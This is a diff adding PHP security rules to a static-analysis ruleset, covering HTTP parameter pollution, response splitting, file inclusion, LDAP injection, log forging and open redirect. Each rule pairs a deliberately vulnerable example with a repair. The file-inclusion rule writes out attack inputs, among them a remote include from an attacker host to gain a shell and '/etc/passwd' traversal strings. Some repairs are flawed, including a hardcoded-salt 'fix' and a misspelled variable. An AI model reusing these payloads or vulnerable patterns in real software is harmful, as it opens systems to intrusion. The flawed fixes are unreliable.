+    <benefits><![CDATA[Avoid compromising hashed values.]]></benefits>
+    <inconvenients><![CDATA[]]></inconvenients>
+    <example><![CDATA[<?php
+  $pass = $_POST['password'];
+  $options = ['cost' => 13, 'salt' => '0102030405060708091011'];
+  // VIOLATION, hardcoded salt provided
+  $hashed = password_hash($pass, PASSWORD_BCRYPT, $options);
+?>]]></example>
+    <repair><![CDATA[<?php
+  $pass = $_POST['password'];
+  // FIXED, let password_hash() compute random salt
+  $options = ['cost' => 13];
+  $hashed = password_hash($pass, PASSWORD_BCRYPT, $options);
+?>]]></repair>
+    <reference><![CDATA[http://php.net/manual/en/function.password-hash.php,http://cwe.mitre.org/data/definitions/760.html]]></reference>
+    <normatives>
+      <security><![CDATA[CWE:760,OWASP:2021:A2,PCI-DSS:6.5.3]]></security>
+    </normatives>
+    <properties/>
+    <idcat>OPT.CRITERIUM_VALUE.CQM.SECURITY</idcat>
+  </rule>
+  <rule name="OPT.PHP.HttpParameterPollution" message="HttpParameterPollution: HTTP parameter pollution (HPP)" class="com.optimyth.qaking.php.rules.security.HttpParameterPollution" technology="PHP" active="true">
+    <tags><![CDATA[ASVS-v4.0.2:5.1.1,CWEScope:Integrity,http-parameter-pollution]]></tags>
+    <description><![CDATA[Concatenating untrusted input into path, query string, or parameters for HTTP message (in the URL or in the request body)
+may allow an attacker to override/add unexpected request parameters. Attacker may change the intended
+HTTP request semantics, and may give him/her access to unauthorized data or bypass web application
+firewall validations.
+
+Such attacks are called HTTP Parameter Pollution (HPP), and exploits the discrepancy in how duplicate request parameters
+were processed to overrde application-specific default values in URLs, with values provided by the attacker.
+
+Note: Do not confuse HPP with Server-Side Request Forgery (SSRF), where the attacker has control over the
+full request URL, including host and port. For HPP attack, attacker has control over other parts like the query string
+part of the URL. Remember the format of an HTTP URL: scheme://user:password@host:port/path?query#fragment
+where query is typically param=value&param2=value. HPP is about attackers controlling path, query or fragment,
+while SSRF means controlling scheme, user, password, host or port.
+
+Like other injection issues, with HPP attackers play with "&" to inject additional parameter (similar to the quote
+in SQL injection), "../" to change the path, ";" (to add matrix parameters to URL at different path segments), or "#"
+to remove ending URL characers (like "--" comment delimiter in SQL injection).
+
+Controlling the path typically changes the semantics of the action represented by the HTTP resource.
+Some REST services use request parameter like _method for selecting the HTTP method, which may be subverted by an HPP attack
+(an HTTP header manipulation flaw could also be leveraged with X-HTTP-Method-Override or similar headers in certain frameworks).
+
+For example, imagine a web application that calls to a remote home-banking REST API. The webapp emits
+a (GET) url https://mybank.com/show-balance/account/X/monetaryUnit?date=now to show the balance for the user account X,
+where X is taken from a trusted source, but where monetaryUnit is taken from a cookie, and concatenated without
+any validation or encoding into the URL. An attacker could pass a Cookie request header set to "../../../transfer/X/to/Y?_method=POST#",
+so the vulnerable web application will create https://mybank.com/show-balance/account/X/../../../transfer/X/to/Y?_method=POST#?date=now
+which is equivalent to a POST https://mybank.com/transfer/X/to/Y.]]></description>
+    <priority>1</priority>
+    <effort>2</effort>
+    <vulntype>Injection</vulntype>
+    <impl>1</impl>
+    <benefits><![CDATA[Avoid unexpected behaviour for HTTP parameter pollution attacks.]]></benefits>
+    <inconvenients><![CDATA[]]></inconvenients>
+    <example><![CDATA[<?php
+  function fetch() {
+    $url = 'https://myserver:port/path?';
+    $fullUrl = $url . 'productId=' . $_POST['productId'];
+    // VIOLATION, productId input not neutralized
+    $data = file_get_contents($fullUrl);
+    // ... show data
+  }
+?>]]></example>
+    <repair><![CDATA[// Either Validate input (productId in the example), making sure that it matches a productId,
+// so no extra HTTP parameters could be injected. Alternatively, urlencode each value
+// or even use http_build_query(), so any URL metacharacter will be escaped.
+<?php
+  function fetch() {
+    $url = 'https://myserver:port/path?';
+    // FIXED
+    $fullUrl = $url . 'productId=' . urlencode($_POST['productId']);
+    $data = file_get_contents($fullUrl);
+    // ... show data
+  }
+?>]]></repair>
+    <reference><![CDATA[http://cwe.mitre.org/data/definitions/235.html,RESTing On Your Laurels will Get YOu Pwned - https://www.defcon.org/images/defcon-21/dc-21-presentations/Kang-Cruz/DEFCON-21-Kang-Cruz-RESTing-On-Your-Laurels-Will-Get-You-Pwned-Updated.pdf]]></reference>
+    <normatives>
+      <security><![CDATA[CWE:235,OWASP:2021:A4,PCI-DSS:6.5.6,WASC:20]]></security>
+    </normatives>
+    <properties/>
+    <idcat>OPT.CRITERIUM_VALUE.CQM.SECURITY</idcat>
+  </rule>
+  <rule name="OPT.PHP.HttpSplitting" message="HttpSplitting: Improper Neutralization of CRLF Sequences in HTTP Headers ('HTTP Response Splitting')" class="com.optimyth.qaking.php.rules.security.HttpSplittingRule" technology="PHP" active="true">
+    <tags><![CDATA[CWEScope:Access-Control,CWEScope:Integrity]]></tags>
+    <description><![CDATA[Software places user-controlled input in HTTP headers. An attacker could inject line separators (CR/LF sequences)
+that could split the response message generated by the software into two messages. The second response is completely
+under the control of the attacker (intermediate web proxies may cache it), with could produce multiple conditions
+(web defacement, cache poisoning, cross-site scripting or page hijacking, see CWE-113 for full details).
+
+If software needs to generate HTTP headers depending on user-controlled input, such input should be properly neutralized
+(a white-list validation excluding CR/LF is recommended). Please note that cookies are received and sent in 'Cookie' header in HTTP messages,
+so if the software generates a Cookie from user input, the input should be properly validated as well.
+
+NOTE: Since PHP 4.4.2 / 5.1.2 this vulnerability was removed, as header() and setcookie() functions neutralize CR (carriage-return)
+and LF (line-feed) characters that could be potentially injected thru those functions.]]></description>
+    <priority>1</priority>
+    <effort>4</effort>
+    <vulntype>Injection</vulntype>
+    <impl>1</impl>
+    <benefits><![CDATA[It improves the safety.]]></benefits>
+    <inconvenients><![CDATA[]]></inconvenients>
+    <example><![CDATA[<?php
+  /* Sample in header() function documentation, not vulnerable under PHP 4.2.2 or later */
+  $host  = $_SERVER['HTTP_HOST']; // This is really user-controlled, if CR/LF passed, HTTP Splitting condition could happen
+  $uri   = rtrim(dirname($_SERVER['PHP_SELF']), '/\\');
+  $extra = 'mypage.php';
+  // VIOLATION, HTTP Response Splitting vulnerability, at least for PHP 4.4.1 and lower
+  header("Location: http://$host$uri/$extra");
+  exit;
+?>]]></example>
+    <repair><![CDATA[<?php
+  /* Sample in header() function documentation, with neutralization */
+  $host  = rawurlencode($_SERVER['HTTP_HOST']); // Neutralized, CR/LF are encoded
+  $uri   = rawurlencode(rtrim(dirname($_SERVER['PHP_SELF']), '/\\'));
+  $extra = 'mypage.php';
+  // FIXED
+  header("Location: http://$host$uri/$extra");
+  exit;
+?>]]></repair>
+    <reference><![CDATA[http://cwe.mitre.org/data/definitions/113.html]]></reference>
+    <normatives>
+      <security><![CDATA[CWE:113,OWASP:2021:A3,PCI-DSS:6.5.1,WASC:25]]></security>
+    </normatives>
+    <properties>
+      <property name="inputs" descname="Comma-separated list of input types to consider as sources (user_input, file_input, database_input, other_input)" value="user_input"/>
+    </properties>
+    <idcat>OPT.CRITERIUM_VALUE.CQM.SECURITY</idcat>
+  </rule>
+  <rule name="OPT.PHP.HttpToSendData" message="HttpToSendData: Avoid using HTTP instead of HTTPS" class="com.optimyth.qaking.php.rules.security.HttpToSendData" technology="PHP" active="true">
+    <tags><![CDATA[ASVS-v4.0.2:6.1.1,ASVS-v4.0.2:6.1.2,ASVS-v4.0.2:6.1.3,CWEScope:Confidentiality,CWEScope:Integrity]]></tags>
+    <description><![CDATA[Data sent over HTTP is sent in cleartext and can be sniffed by unauthorized actors.
+        
+Use HTTPS procotol instead.]]></description>
+    <priority>2</priority>
+    <effort>2</effort>
+    <vulntype>Information leaks</vulntype>
+    <impl>1</impl>
+    <benefits><![CDATA[Avoid exposing sensitive data.]]></benefits>
+    <inconvenients><![CDATA[]]></inconvenients>
+    <example><![CDATA[<?php
+$r = new HttpRequest('http://example.com/userinfo', HttpRequest::METH_GET);  // VIOLATION
+try {
+    $r->send();
+    if ($r->getResponseCode() == 200) {
+        file_put_contents('userinfo.txt', $r->getResponseBody());
+    }
+} catch (HttpException $ex) {
+    echo $ex;
+}
+?>]]></example>
+    <repair><![CDATA[<?php
+$r = new HttpRequest('https://example.com/userinfo', HttpRequest::METH_GET);  // OK
+try {
+    $r->send();
+    if ($r->getResponseCode() == 200) {
+        file_put_contents('userinfo.txt', $r->getResponseBody());
+    }
+} catch (HttpException $ex) {
+    echo $ex;
+}
+?>]]></repair>
+    <reference><![CDATA[http://cwe.mitre.org/data/definitions/311.html]]></reference>
+    <normatives>
+      <security><![CDATA[CWE:311,OWASP:2021:A4,PCI-DSS:6.5.4]]></security>
+    </normatives>
+    <properties>
+      <property name="checkFtpConn" descname="When true then insecure FTP connections are checked too." value="true"/>
+    </properties>
+    <idcat>OPT.CRITERIUM_VALUE.CQM.SECURITY</idcat>
+  </rule>
+  <rule name="OPT.PHP.IncludeFileInjection" message="IncludeFileInjection: Improper Control of filename for include / require statement" class="com.optimyth.qaking.php.rules.security.IncludeFileInjectionRule" technology="PHP" active="true">
+    <tags><![CDATA[ASVS-v4.0.2:12.3.3,CWEScope:Availability,CWEScope:Confidentiality,CWEScope:Integrity]]></tags>
+    <description><![CDATA[The PHP application receives input from an upstream component, but it does not restrict or incorrectly restricts the input
+before its usage in include / include_once / require / require_once, or similar statements.
+
+The attacker may be able to specify arbitrary code to be executed from a remote location, by providing an URL.
+It could also read PHP source or other local files. Alternatively, it may be possible to use normal program behaviour to insert
+PHP code into files on the local machine which can then be included and force the code to execute, since PHP ignores everything
+in the file except for the content between php specifiers.
+
+There are many attack avenues for this issue:
+
+1) Basic local file inclusion: include("includes/" . $_GET['file']);
+   By providing file=.htaccess or file=../../var/lib/locate.db, attacker may see local files, even out of the webapp directory.
+   By providing file=uploads/my_hacker_upload.php, the attacker may upload code that will be executed by PHP.
+
+2) Limited local file inclusion: include("includes/" . $_GET['file'] . ".htm");
+   The attacker may inject null byte and get rid of the appended extension (requires magic_quotes_gpc=on in php.ini)
+   file=../../../../../../../../../etc/passwd%00
+
+3) Basic remote file inclusion: include($_GET['file']);
+   By providing file=http://attacker.com/shell.php, the attacker may inject arbitrary code (e.g. get a reverse shell)
+   Requires allow_url_fopen=On and allow_url_include=On in php.ini. By providing file=php://input, the attacker could add
+   payload in the POST data (like <?php phpinfo(); ?>), requires allow_url_include=On.
+   By providing file=php://filter/convert.base64-encode/resource=index.php, the attacker could read PHP code in webapp
+   (or binary files...). This is NOT restricted by allow_url_fopen or allow_url_include.
+
+As include statements that could be partially controlled by user input is very dangerous, it is recommended to avoid dependency
+on any user-controlled input in the included resource, or at least use file neutralization functions like basename() or pathinfo().
+
+NOTE: If the 'avoidUrlIncludes' is set to true, includes from a remote URL are also forbidden, as the remote server could
+be compromised, and could return malicious code as attack vector against the analyzed software.
+Although since PHP 5.2 URL includes are deactivated by default, allow_url_include could be enabled in the PHP configuration.]]></description>
+    <priority>1</priority>
+    <effort>4</effort>
+    <vulntype>File handling</vulntype>
+    <impl>1</impl>
+    <benefits><![CDATA[It improves the safety.]]></benefits>
+    <inconvenients><![CDATA[]]></inconvenients>
+    <example><![CDATA[<?php
+  $dir = __DIR__;
+  include 'header.php'; // safe
+  // VIOLATION, page HTTP field is under user control, vulnerable to path traversal
+  // could use '.htaccess', '../../../etc/passwd', etc.
+  include "$dir/$_REQUEST['page']";
+  include "http://other/path/external.php"; // VIOLATION when avoidUrlIncludes=true
+?>]]></example>
+    <repair><![CDATA[<?php
+  $dir = __DIR__;
+  // considered neutralized, attacker cannot get out of __DIR__
+  $page = pathinfo( $_REQUEST['page'] )['basename'];
+  include 'header.php'; // safe
+  include "$dir/$page"; // FIXED
+?>]]></repair>
+    <reference><![CDATA[http://cwe.mitre.org/data/definitions/98.html]]></reference>
+    <normatives>
+      <security><![CDATA[CWE:98,CWETOP25:2010:13,OWASP:2021:A3,PCI-DSS:6.5.1,WASC:05]]></security>
+    </normatives>
+    <properties>
+      <property name="inputs" descname="Comma-separated list of input types to consider as sources (user_input, file_input, database_input, other_input)" value="user_input"/>
+      <property name="avoidUrlIncludes" descname="If true, dangerous includes from remote URLs are forbidden" value="true"/>
+    </properties>
+    <idcat>OPT.CRITERIUM_VALUE.CQM.SECURITY</idcat>
+  </rule>
+  <rule name="OPT.PHP.InformationExposureThroughErrorMessage" message="InformationExposureThroughErrorMessage: Avoid sensitive information exposure through error messages" class="com.optimyth.qaking.php.rules.security.InformationExposureThroughErrorMessage" technology="PHP" active="true">
+    <tags><![CDATA[ASVS-v4.0.2:14.3.1,CWEScope:Confidentiality]]></tags>
+    <description><![CDATA[When an error message is generated, care should be taken to ensure that it does not contain
+sensitive information about the environment, users or any other information that may be considered sensitive.
+
+Such information may be valuable itself or may be useful for further attacks with a higher impact.
+
+Also attention should not only be paid to information explicitly included into error messages (for example by using echo),
+but also to certain functions that may produce an error that unexpectedly shows sensitive information, like when using the
+fopen function. In this situations it is necessary to check that the possible errors are handled somehow.]]></description>
+    <priority>2</priority>
+    <effort>3</effort>
+    <vulntype>Information leaks</vulntype>
+    <impl>1</impl>
+    <benefits><![CDATA[Avoid sensitive information leakage.]]></benefits>
+    <inconvenients><![CDATA[]]></inconvenients>
+    <example><![CDATA[<?php
+  $file=fopen("opt.txt","r");       // VIOLATION
+
+  try {
+    openConnection();
+  }
+  catch (Exception $e) {
+    echo 'Check credentials in config file at: ', $Mysql_config_location, '\n';		// VIOLATION
+  }
+?>]]></example>
+    <repair><![CDATA[<?php
+  error_reporting(0);    // Error reporting directive is set
+
+  if(!file_exists("opt.txt")) {
+    die("File not found");
+  } else {
+    $file=fopen("opt.txt","r");   // Also function executions errors are handle somehow
+  }
+
+  try {
+    openDbConnection();
+  }
+  catch (Exception $e) {
+    echo 'Caught exception: ', $e->getMessage(), '\n';
+  }
+?>]]></repair>
+    <reference><![CDATA[http://projects.webappsec.org/w/page/13246936/Information%20Leakage,https://cwe.mitre.org/data/definitions/209.html]]></reference>
+    <normatives>
+      <security><![CDATA[CWE:209,OWASP:2021:A4,WASC:13]]></security>
+    </normatives>
+    <properties/>
+    <idcat>OPT.CRITERIUM_VALUE.CQM.SECURITY</idcat>
+  </rule>
+  <rule name="OPT.PHP.InsecurePhpConfiguration" message="InsecurePhpConfiguration: Avoid insecure configuration settings in php.ini / .htaccess descriptors" class="com.optimyth.qaking.php.rules.security.InsecurePhpConfiguration" technology="PHP" active="true">
+    <tags><![CDATA[ASVS-v4.0.2:10.3.1,ASVS-v4.0.2:14.1.3,ASVS-v4.0.2:2.5.4,ASVS-v4.0.2:3.4.3,ASVS-v4.0.2:3.4.4,ASVS-v4.0.2:3.4.5]]></tags>
+    <description><![CDATA[The rule checks for php.ini and .htaccess configuration files found in analyzed software, and checks that certain
+security sensitive properties have proper values. For each configuration property with a value considered insecure,
+a violation will be emitted.
+
+Programmatic configuration, using ini_set() PHP function, is also checked for the configured properties.
+
+For example, PHP recommends safe_mode to be set to Off as this gives a false sense of security (such property was deprecated
+in PHP 5.3 and removed in PHP 5.4).
+
+See https://www.owasp.org/index.php/PHP_Configuration_Cheat_Sheet for full details.]]></description>
+    <priority>1</priority>
+    <effort>2</effort>
+    <vulntype>Misconfiguration</vulntype>
+    <impl>1</impl>
+    <benefits><![CDATA[Avoid common security issues due to improper security in production php.ini / .htaccess files.]]></benefits>
+    <inconvenients><![CDATA[]]></inconvenients>
+    <example><![CDATA[]]></example>
+    <repair><![CDATA[]]></repair>
+    <reference><![CDATA[https://cwe.mitre.org/data/definitions/16.html,https://www.owasp.org/index.php/PHP_Configuration_Cheat_Sheet]]></reference>
+    <normatives>
+      <security><![CDATA[CWE:16,OWASP:2021:A5]]></security>
+    </normatives>
+    <properties>
+      <property name="booleanPropertiesOn" descname="Comma-separated list of php.ini boolean properties that should be on" value="cgi.force_redirect, session.cookie_httponly"/>
+      <property name="errorReporting" descname="Allowed value for the error_reporting configuration property" value="E_ALL"/>
+      <property name="unsetProperties" descname="Comma-separated list of configuration properties that should be set in certain contexts." value="open_basedir, safe_mode_exec_dir"/>
+      <property name="disabledFunctions" descname="Comma-separated list of functions to be included in the disabled_functions configuration property" value="chdir, chmod, dbase_open, dbmopen, exec, filepro, filepro_retrieve, filepro_rowcount, fopen_with_path, mkdir, move_uploaded_file, passthru, phpinfo, popen, posix_mkfifo, proc_open, putenv, rename, rmdir, shell_exec, show_source, system"/>
+      <property name="booleanPropertiesOff" descname="Comma-separated list of boolean configuration properties that should be off" value="allow_url_fopen, allow_url_include, allow_webdav_methods, display_errors, display_startup_errors, enable_dl, expose_php, #file_uploads, magic_quotes_gpc, magic_quotes_runtime, magic_quotes_sybase, register_argc_argv, register_globals, safe_mode, session.auto_start, session.use_trans_sid"/>
+    </properties>
+    <idcat>OPT.CRITERIUM_VALUE.CQM.SECURITY</idcat>
+  </rule>
+  <rule name="OPT.PHP.InsecureRandomness" message="InsecureRandomness: Standard pseudo-random number generators cannot withstand cryptographic attacks" class="com.optimyth.qaking.php.rules.security.InsecureRandomness" technology="PHP" active="true">
+    <tags><![CDATA[ASVS-v4.0.2:2.3.1,ASVS-v4.0.2:2.6.2,ASVS-v4.0.2:2.9.2,ASVS-v4.0.2:6.3.1,ASVS-v4.0.2:6.3.2,ASVS-v4.0.2:6.3.3,CWEScope:Access-Control,CWEScope:Confidentiality,crypto,prng]]></tags>
+    <description><![CDATA[Insecure randomness errors occur when a function that can produce predictable values is used as a source of randomness
+in security-sensitive context.
+
+Computers are deterministic machines, and as such are unable to produce true randomness. Pseudo-Random Number Generators (PRNGs)
+approximate randomness algorithmically, starting with a seed from which subsequent values are calculated.
+
+There are two types of PRNGs: statistical and cryptographic. Statistical PRNGs provide useful statistical properties,
+but their output is highly predictable, and forms an easy to reproduce numeric stream that is unsuitable for use
+in cases where security depends on generated values being unpredictable.
+
+Examples of statistical generators are rand(), mt_rand() or lcg_value(), among others.
+
+Cryptographic PRNGs address this problem by generating output that is more difficult to predict.
+For a value to be cryptographically secure, it must be impossible or highly improbable for an attacker to distinguish
+between it and a truly random value.
+
+In general, if a PRNG algorithm is not advertised as being cryptographically secure, then it is probably a statistical PRNG
+and should not be used in security-sensitive contexts, where its use can lead to serious vulnerabilities such as
+easy-to-guess temporary passwords, predictable cryptographic keys, session hijacking, and DNS spoofing.]]></description>
+    <priority>2</priority>
+    <effort>3</effort>
+    <vulntype>Encryption and randomness</vulntype>
+    <impl>1</impl>
+    <benefits><![CDATA[]]></benefits>
+    <inconvenients><![CDATA[]]></inconvenients>
+    <example><![CDATA[// The following code uses a statistical PRNG to create a token for a receipt
+// that remains active for some period of time after a purchase.
+
+function createReceiptToken($length = 16) {
+  $chars = '0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ';
+  $charsLength = strlen($chars);
+  $randomString = '';
+  for ($i = 0; $i < $length; $i++) {
+    $i = rand(0, $charsLength - 1); // VIOLATION, stronger PRNG needed here
+    $randomString .= $characters[$i];
+  }
+  return $randomString;
+}]]></example>
+    <repair><![CDATA[]]></repair>
+    <reference><![CDATA[http://cwe.mitre.org/data/definitions/338.html,http://cwe.mitre.org/data/definitions/330.html,https://paragonie.com/blog/2015/07/how-safely-generate-random-strings-and-integers-in-php]]></reference>
+    <normatives>
+      <security><![CDATA[CWE:330,CWE:338,OWASP:2021:A2,PCI-DSS:6.5.3]]></security>
+    </normatives>
+    <properties>
+      <property name="pattern" descname="Regular expression for detecting when a non-cryptographic PRNG is used in a security context.
+When blank, any non-cryptographic PRNG usage is reported as a rule violation." value="password|passwd|receipt|session|user|key|csrf|token|hash|mac|digest|uuid|guid|crypto|encrypt|decrypt"/>
+    </properties>
+    <idcat>OPT.CRITERIUM_VALUE.CQM.SECURITY</idcat>
+  </rule>
+  <rule name="OPT.PHP.LdapInjection" message="LdapInjection: Avoid non-neutralized user-controlled input in LDAP search filters" class="com.optimyth.qaking.php.rules.security.LdapInjectionRule" technology="PHP" active="true">
+    <tags><![CDATA[ASVS-v4.0.2:5.3.7,CWEScope:Availability,CWEScope:Confidentiality,CWEScope:Integrity]]></tags>
+    <description><![CDATA[Software constructs all or part of an LDAP query or search filter using externally-influenced input, but it does not neutralize or incorrectly neutralizes special elements that could modify the intended LDAP query when sent to LDAP server.]]></description>
+    <priority>1</priority>
+    <effort>4</effort>
+    <vulntype>Injection</vulntype>
+    <impl>1</impl>
+    <benefits><![CDATA[It improves the safety.]]></benefits>
+    <inconvenients><![CDATA[]]></inconvenients>
+    <example><![CDATA[$ds = ldap_connect(LDAP_HOST);
+$root = 'o=My Company, c=US';
+$ldapQuery = "(& (sn = " . $_GET['lastname'] . ") (givenName = " . $_GET['firstname'] . "*))";
+// VIOLATION, LDAP Injection vulnerability, as $ldapQuery is tainted with user-controlled input
+$result = ldap_search($ds, $root, $ldapQuery);]]></example>
+    <repair><![CDATA[// PHP does not provide default LDAP neutralization functions. Something like this could help,
+// register ldap_escape as neutralization for ldap_injection in a custom PHP library descriptor.
+function ldap_escape($str, $for_dn = false)
+{
+    // See: RFC2254
+    if  ($for_dn)
+        $metaChars = array(',','=', '+', '<','>',';', '\\', '"', '#');
+    else
+        $metaChars = array('*', '(', ')', '\\', chr(0));
+
+    $quotedMetaChars = array();
+    foreach ($metaChars as $key => $value) $quotedMetaChars[$key] = '\\'.str_pad(dechex(ord($value)), 2, '0');
+    $str=str_replace($metaChars,$quotedMetaChars,$str); //replace them
+    return ($str);
+}
+
+$ds = ldap_connect(LDAP_HOST);
+$root = 'o=My Company, c=US';
+$lastname = ldap_escape($_GET['lastname']);  //OK
+$firstname = ldap_escape($_GET['firstname']);  //OK
+$ldapQuery = "(& (sn = " . $lastname . ") (givenName = " . $firstname . "*))";]]></repair>
+    <reference><![CDATA[http://cwe.mitre.org/data/definitions/90.html]]></reference>
+    <normatives>
+      <security><![CDATA[CWE:90,OWASP:2021:A3,PCI-DSS:6.5.1,WASC:29]]></security>
+    </normatives>
+    <properties>
+      <property name="inputs" descname="Comma-separated list of input types to consider as sources (user_input, file_input, database_input, other_input)" value="user_input"/>
+    </properties>
+    <idcat>OPT.CRITERIUM_VALUE.CQM.SECURITY</idcat>
+  </rule>
+  <rule name="OPT.PHP.LogForging" message="LogForging: Improper Output Neutralization for Logs" class="com.optimyth.qaking.php.rules.security.LogForging" technology="PHP" active="true">
+    <tags><![CDATA[ASVS-v4.0.2:7.3.1,ASVS-v4.0.2:7.3.2,CWEScope:Availability,CWEScope:Confidentiality,CWEScope:Integrity,CWEScope:Non-Repudiation]]></tags>
+    <description><![CDATA[When the application writes untrusted input to a log destination (using any PHP logging function),
+a "log forging" attack could be launched to inject false log entries, corrupt log entries,
+or even exploit a vulnerability in an external log viewer application.
+
+Corrupted log entries could hinder detection for malicious activity, or implicate another party
+in the commission of a malicious act.]]></description>
+    <priority>2</priority>
+    <effort>2</effort>
+    <vulntype>Injection</vulntype>
+    <impl>1</impl>
+    <benefits><![CDATA[]]></benefits>
+    <inconvenients><![CDATA[]]></inconvenients>
+    <example><![CDATA[<?php
+  $action = $_GET['action'];
+  $name = $_GET['name'];
+
+  if(is_valid($action)) {
+    // ...
+  } else {
+    trigger_error("Attempt to execute invalid operation: $action, name: $name"); // VIOLATION
+  }
+?>]]></example>
+    <repair><![CDATA[// Neutralize message with untrusted input, before passing to logging API
+<?php
+  $action = $_GET['action'];
+  $name = $_GET['name'];
+
+  if(is_valid($action)) {
+    // ...
+  } else {
+    $action = preg_replace('/\s+/', ' ', $action);
+    $name = preg_replace('/\s+/', ' ', $name);
+    trigger_error("Attempt to execute invalid operation: $action, name: $name"); // FIXED
+  }
+?>]]></repair>
+    <reference><![CDATA[https://www.owasp.org/index.php/Log_Injection,https://cwe.mitre.org/data/definitions/117.html,https://cheatsheetseries.owasp.org/cheatsheets/Logging_Cheat_Sheet.html]]></reference>
+    <normatives>
+      <security><![CDATA[CWE:117,OWASP:2021:A9,PCI-DSS:10.5.2,WASC:20]]></security>
+    </normatives>
+    <properties/>
+    <idcat>OPT.CRITERIUM_VALUE.CQM.SECURITY</idcat>
+  </rule>
+  <rule name="OPT.PHP.MailHeaderManipulation" message="MailHeaderManipulation: SMTP Header manipulation" class="com.optimyth.qaking.php.rules.security.MailHeaderManipulation" technology="PHP" active="true">
+    <tags><![CDATA[CWEScope:Integrity]]></tags>
+    <description><![CDATA[PHP provides functions like mail(), that may allow an attacker to inject additional headers, changing the intended message.
+
+Including unvalidated data in an SMTP header can enable attackers to add arbitrary headers, such as Cc or Bcc,
+that can be used to leak the mail contents to the attacker, or even use the mail server as a spam generator.]]></description>
+    <priority>1</priority>
+    <effort>3</effort>
+    <vulntype>Injection</vulntype>
+    <impl>1</impl>
+    <benefits><![CDATA[]]></benefits>
+    <inconvenients><![CDATA[]]></inconvenients>
+    <example><![CDATA[<?php
+  $subject = $_GET['subject'];
+  $body =  $_GET['body'];
+  // VIOLATION, attacker may add extra CR/LF and add new SMTP headers, like Cc or Bcc
+  @mail( "destination@myorg.com", "[Subject: " . $subject . "]", $body );
+?>]]></example>
+    <repair><![CDATA[]]></repair>
+    <reference><![CDATA[https://www.owasp.org/index.php/Testing_for_IMAP/SMTP_Injection_%28OTG-INPVAL-011%29,http://www.webappsec.org/projects/articles/121106.pdf]]></reference>
+    <normatives>
+      <security><![CDATA[CWE:93,OWASP:2021:A3,PCI-DSS:6.5.1,WASC:42]]></security>
+    </normatives>
+    <properties/>
+    <idcat>OPT.CRITERIUM_VALUE.CQM.SECURITY</idcat>
+  </rule>
+  <rule name="OPT.PHP.MissingEncryptionOfSensitiveData" message="MissingEncryptionOfSensitiveData: Encrypt sensitive data before transmission or storage" class="com.optimyth.qaking.php.rules.security.MissingEncryptionOfSensitiveData" technology="PHP" active="true">
+    <tags><![CDATA[ASVS-v4.0.2:6.1.1,ASVS-v4.0.2:6.1.2,ASVS-v4.0.2:6.1.3,CWEScope:Confidentiality,CWEScope:Integrity]]></tags>
+    <description><![CDATA[Transmitting or storing certain sensitive information without encryption can be a problem
+when a malicious attacker gains access to it. Even it could be worst if the attacker use that information to force the flow of the
+program to get the execution of some part of it.
+
+Such information may be valuable itself or may be useful for further attacks with a higher impact.]]></description>
+    <priority>2</priority>
+    <effort>2</effort>
+    <vulntype>Encryption and randomness</vulntype>
+    <impl>1</impl>
+    <benefits><![CDATA[Ensures the data confidentiality and integrity.]]></benefits>
+    <inconvenients><![CDATA[]]></inconvenients>
+    <example><![CDATA[<?php
+  $password = “password”;
+  $username = “username”;
+
+  //flaw
+  $conn = pg_pconnect("dbname=publisher");
+  if (!$conn) {
+    echo "An error occured.\n";
+    exit;
+  }
+  $query  = sprintf("INSERT INTO users(name,pwd) VALUES('%s','%s');",
+              pg_escape_string($username),
+              pg_escape_string($password));
+
+  $result = pg_query($conn, $query);        // VIOLATION
+
+  $var = setcookie("userdata", $password);        // VIOLATION
+?>]]></example>
+    <repair><![CDATA[<?php
+  $password = “password”;
+  $username = “username”;
+  // FIXED, sensitive data is
+  $passeword = crypt($password, "$5$rounds=5000$usesomesillystringforsalt$");
+
+  $conn = pg_pconnect("dbname=publisher");
+  if (!$conn) {
+    echo "An error occured.\n";
+    exit;
+  }
+  $query  = sprintf("INSERT INTO users(name,pwd) VALUES('%s','%s');",
+              pg_escape_string($username),
+              pg_escape_string($password));
+
+  $result = pg_query($conn, $query); // OK
+
+  $var = setcookie("userdata", $passeword); // OK
+?>]]></repair>
+    <reference><![CDATA[http://projects.webappsec.org/w/page/13246936/Information%20Leakage,https://cwe.mitre.org/data/definitions/311.html]]></reference>
+    <normatives>
+      <security><![CDATA[CWE:311,OWASP:2021:A4,WASC:13]]></security>
+    </normatives>
+    <properties/>
+    <idcat>OPT.CRITERIUM_VALUE.CQM.SECURITY</idcat>
+  </rule>
+  <rule name="OPT.PHP.OpenRedirect" message="OpenRedirect: URL Redirection to Untrusted Site ('Open Redirect')" class="com.optimyth.qaking.php.rules.security.OpenRedirect" technology="PHP" active="true">
+    <tags><![CDATA[ASVS-v4.0.2:5.1.5,CWEScope:Access-Control,CWEScope:Confidentiality]]></tags>
+    <description><![CDATA[Open Redirect flaws happen when a web application redirects the browser to an URL that is under control of a potential attacker,
+without validation. The programmer typically encodes the redirect URL in a form "hidden field", but obviously an
+attacker may build a malicious URL with the redirect field pointing to a malicious website, and deceive the victim
+to follow that malicious URL.
+
+An attacker benefits from the trust a user has in a specific website (vulnerable to open redirect), and redirect to
+a third-party (malicious) website, for phising and other scams. Attackers obfuscate the redirect url in the attack url,
+directed at the vulnerable page in the trusted site. Only security-savvy users double-check URLs before clicking on links,
+so sensitive applications should not have open redirect vulnerabilities.
+
+The rule detects a path in code between an input statement (source) and a redirect statement (sink), to an URL depending
+on non neutralized input.]]></description>
+    <priority>1</priority>
+    <effort>4</effort>
+    <vulntype>Injection</vulntype>
+    <impl>1</impl>
+    <benefits><![CDATA[Prevent Open redirect attacks.]]></benefits>
+    <inconvenients><![CDATA[]]></inconvenients>
+    <example><![CDATA[<?php
+        $strDest = $_GET["dest"];
+        header("Location: " . $strDest);   // VIOLATION
+?>]]></example>
+    <repair><![CDATA[<?php
+        $strDest = $_GET["dest"];
+        if (in_array($strDest, $allowedDestinations)) { header("Location: " . $strDest); }
+?>]]></repair>
+    <reference><![CDATA[http://cwe.mitre.org/data/definitions/601.html]]></reference>
+    <normatives>
+      <security><![CDATA[CWE:601,CWETOP25:2021:37,OWASP:2013:A10,PCI-DSS:6.5.8,WASC:33]]></security>
+    </normatives>
+    <properties>
+      <property name="inputs" descname="Comma-separated list of input types to consider as sources (user_input, file_input, database_input, other_input)" value="user_input"/>
+      <property name="allUserFunctionsNeutralize" descname="Enables neutralization for all user defined functions (those not defined in library)" value="true"/>
+    </properties>
+    <idcat>OPT.CRITERIUM_VALUE.CQM.SECURITY</idcat>
+  </rule>
